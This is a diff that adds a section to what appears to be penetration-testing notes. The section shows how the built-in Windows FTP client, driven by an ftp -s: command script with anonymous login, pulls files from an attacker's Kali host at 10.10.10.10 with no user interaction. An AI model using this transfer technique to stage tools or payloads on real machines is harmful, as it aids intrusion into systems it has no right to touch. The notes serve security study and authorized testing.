@@ -265,6 +265,23 @@ You can detect and exploit this vulnerability with metasploit using the module: 
 
 TODO: Categorize each of these, prep for scripting, add descriptions
 
+### 
+
+### Download files with Windows FTP
+
+Windows has an FTP client built in that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line.  To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that.  Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:
+
+```text
+open 10.10.10.10
+anonymous
+anythingoeshere
+binary
+get $file_to_download
+bye
+```
+
+Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.
+
 ### Download files with PowerShell
 
 #### Using System.Net.WebClient
